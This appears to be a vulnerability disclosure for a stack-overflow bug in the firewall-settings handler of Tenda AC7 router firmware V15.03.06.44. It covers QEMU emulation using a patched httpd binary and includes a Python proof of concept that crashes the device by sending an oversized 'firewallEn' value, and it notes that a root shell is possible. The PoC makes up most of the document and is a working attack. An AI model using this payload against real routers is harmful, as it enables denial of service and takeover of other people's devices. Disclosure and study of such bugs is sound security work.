### Environmental simulation

need build Network bridge:

```text-plain
apt install uml-utilities bridge-utils
brctl addbr br0
ifconfig br0 192.168.142.100/24
brctl addif br0 ens33//搭建网桥
```

Directly using the httpd in the original firmware will cause the simulation to fail due to the environment check. Here is the patched httpd file (a7\_\_V15.03.06.44\_httpd\_ok file in this project) (modify the assembly to force skip the environment check step): [https://github.com/Raining-101/IOT\_cve/blob/main/a7\_\_V15.03.06.44\_httpd\_ok](https://github.com/Raining-101/IOT_cve/blob/main/a7__V15.03.06.44_httpd_ok)

qemu command：

```text-plain
sudo qemu-mipsel-static -L . ./bin/httpd
```

Attacked version

V15.03.06.44

Vulnerability Details
---------------------

The Tenda AC7  V15.03.06.44 was found to have a stack overflow vulnerability in the formSetFirewallCfg function. An attacker can obtain a stable root shell through a carefully constructed payload.

In the function, the (the value of ) we entered is directly copied into the array through the function.It is not secure, as long as the size of the data we enter is larger than the size of , it will cause a stack overflow.`formSetFirewallCfgfirewall_valuefirewallEnfirewall_bufstrcpyfirewall_buf`

Recurring vulnerabilities and POC
---------------------------------

In order to reproduce the vulnerability, the following steps can be followed:

1.  Boot the firmware by qemu-system or other ways (real machine)
2.  Attack with the following POC attacks

```text-plain
import requests


url = "http://192.168.0.1/goform/SetFirewallCfg"


headers = {
    "Host": "192.168.0.1", 
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0",
    "Accept": "*/*",
    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "http://192.168.0.1",  
    "DNT": "1",
    "Connection": "close",
    "Referer": "http://192.168.0.1/index.html"  
}

cookies = {
    "ecos_pw": "eee",
    "language": "cn"
}

payload = {
    "firewallEn": "a" * 1000  
}

try:
    response = requests.post(
        url=url,
        headers=headers,
        cookies=cookies,
        data=payload,
    )
    

    
except requests.exceptions.RequestException as e:
    print(f"Request failed: {e}")
```

By sending this poc, we can achieve the effect of a denial-of-service(DOS) attack .

Of course, you can also write poc to keep the root shell (because the pc register is controllable).
